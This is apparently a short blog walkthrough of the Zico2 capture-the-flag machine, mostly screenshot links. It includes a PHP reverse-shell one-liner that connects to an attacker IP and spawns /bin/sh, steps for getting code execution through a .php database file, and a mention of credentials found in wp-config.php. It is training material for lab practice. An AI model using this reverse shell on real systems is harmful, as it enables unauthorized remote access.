...
layout: post
title: "Zico2 writeup"
subtitle: "~ Walkthrough of Zico2 2 machine ~"
date: 2017-10-07
author: V3ded
category: CTF
...
<a href="/img/blog/zico2/Zico1.png">
...
<a href="/img/blog/zico2/Zico4.png">

The php file leads to:

<a href="/img/blog/zico2/Zico5.png">
...
If you read the searchsploit file, getting the shell will be easy. There are of course many ways to approach this vulnerability, but I chose the following:

1. Make a txt file inside /var/www/html with `<?php $sock=fsockopen("192.168.1.12",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>` as contents (this is our reverse shell - taken from (pentestmonkey)[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet])
2. Start an apache web server using `/etc/init.d/apache2 start`


To proceed with our exploitation, do as the pdf says. Create a database with a .php extension (in my case shell.php):  

<a href="/img/blog/zico2/Zico6.png">

Add a table in it called shell with 1 field:      

<a href="/img/blog/zico2/Zico7.png">
...
<a href="/img/blog/zico2/Zico8.png">
...
<a href="/img/blog/zico2/Zico9.png">
...
<a href="/img/blog/zico2/Zico10.png">

After some exploration I discovered a wp-config.php file which is present with zico's login credentials.

<a href="/img/blog/zico2/Zico11.png"> 
...
<a href="/img/blog/zico2/Zico12.png">
...
<a href="/img/blog/zico2/Zico13.png">
